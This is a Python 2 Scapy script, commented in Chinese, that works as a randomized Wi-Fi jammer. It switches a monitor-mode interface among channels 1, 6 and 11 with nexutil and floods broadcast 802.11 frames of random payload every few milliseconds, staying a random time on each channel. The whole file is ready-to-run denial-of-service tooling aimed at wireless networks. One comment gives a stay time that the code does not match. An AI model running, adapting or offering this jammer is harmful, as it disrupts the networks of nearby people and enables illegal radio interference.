#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
from collections import namedtuple
import random
import time
import struct
import os

# --- 1. 基础配置 ---
# 确保 'mon0' 已经通过 airmon-ng 或 iw 设置为 Monitor 模式
INTERFACE = "mon0"
CHANNELS = [1, 6, 11]
#os.system("iw dev %s set power_save off" % INTERFACE)
# 初始化 L2 socket
try:
    s = conf.L2socket(iface=INTERFACE)
except Exception as e:
    print "[!] Error: Could not open socket on %s. Check if interface is up." % INTERFACE
    exit(1)

prep = None
# 定义数据结构：Timestamp, Channel, Power, Period(ms), Length(bytes)
JamSetting = namedtuple("JamSetting", "timestamp channel power period length")

# 生成随机负载池
bytelist = [random.randint(-128, 127) for _ in range(1526)]

def update(js):
    """
    更新硬件信道并重新构造待发送的数据包
    """
    global prep
    
    # A. 硬件信道切换
    current_channel = int(js.channel)
    print "[-] Switching hardware to Channel %d" % current_channel
    #os.system("iw dev %s set channel %d" % (INTERFACE, current_channel))
    os.system("nexutil -I %s -k%d" % (INTERFACE, current_channel))
    time.sleep(0.1)
    # B. 构造数据包 (Radiotap + Dot11 + Raw)
    rt = RadioTap(len=18, present='Flags+Rate+Channel+dBm_AntSignal+Antenna')
    rt.Rate = 2
    rt.Channel = current_channel
    rt.dBm_AntSignal = -1 * int(js.power)
    
    hdr = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2='00:11:22:33:44:55', addr3='00:11:22:33:44:55')

    l = int(js.length)
    if l > 1400: 
        l = 1400
    
    sub = bytelist[0:l]
    buf = struct.pack('%sb' % l, *sub)
    pl = Raw(load=buf)

    # 预编译成字节流以提高发送效率
    pkt = rt/hdr/pl
    prep = pkt.build()
    
    print "[-] Config Updated: Ch=%d, Pwr=%s, PktLen=%d" % (current_channel, js.power, l)

# --- 2. 主执行循环 ---

# 设定初始参数（可以在这里修改默认的功率、发包频率和包大小）
# 默认：功率 20, 发包间隔 10ms, 包大小 1400 字节
current_js = JamSetting(timestamp=0, channel=1, power=30, period=7, length=1400)

print "--- Starting Random Jammer ---"
print "[*] Target Channels: %s" % CHANNELS
print "[*] Random Stay Time: 1 to 300 seconds"

try:
    while True:
        # 1. 随机选择一个信道
        target_ch = random.choice(CHANNELS)
        
        # 2. 更新配置对象
        current_js = JamSetting(
            timestamp=time.time(),
            channel=target_ch,
            power=current_js.power,
            period=current_js.period,
            length=current_js.length
        )
        time.sleep(0.1)
        # 3. 执行物理切换和包重组
        update(current_js)

        # 4. 随机决定在该信道的停留时间 (1.0s - 300.0s)
        stay_time = random.uniform(1.0, 10.0)
        expiry = time.time() + stay_time
        
        print "[!] Hopping to Ch %d | Staying for %.2f seconds..." % (target_ch, stay_time)

        # 5. 在停留时间内持续发包
        while time.time() < expiry:
            if current_js.power != 0:
                s.send(prep)
            
            # 保持原有的发包频率 (ms 转换为秒)
            if current_js.period > 0:
                time.sleep(current_js.period / 1000.0)

except KeyboardInterrupt:
    print "\n[+] User requested stop. Exiting..."
except Exception as e:
    print "\n[!] Runtime Error: %s" % e
